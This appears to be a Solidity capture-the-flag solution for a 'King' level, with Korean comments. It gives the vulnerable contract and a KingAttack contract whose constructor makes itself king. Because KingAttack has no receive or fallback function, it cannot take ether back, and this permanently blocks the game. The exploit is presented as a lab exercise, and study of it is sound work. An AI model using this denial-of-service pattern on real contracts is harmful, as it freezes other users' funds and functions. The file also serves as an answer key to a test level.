// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

/*
king이 이더를 받을수 없는 상태이면 평생 king이 바뀌지 않는다.
컨트랙트에 receive,fallback함수가 없으면 이더를 받을수 없는 상태가 된다.
배포 시 King 컨트랙트로 이더를 보내서 이더를 못받는 컨트랙트를 king으로 만들자
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable _king) payable {
        // 배포 시에 바로 King 컨트랙트로 ETH 전송해서 이 컨트랙트 주소를 왕으로 만듬
        _king.call{value: msg.value}("");
    }

    // receive,fallback없어서 이더 받기 불가능하게 만들기
}

/*
prize를 확인해보니 0.001eth다.
위 KingAttack 컨트랙트를 배포할 때 King 컨트랙트 주소를 넣어주고 0.001 이더도 같이 보내준다.
_king을 확인해보면 KingAttack 컨트랙트 주소가 되어있는 것을 볼 수 있다.
끝
*/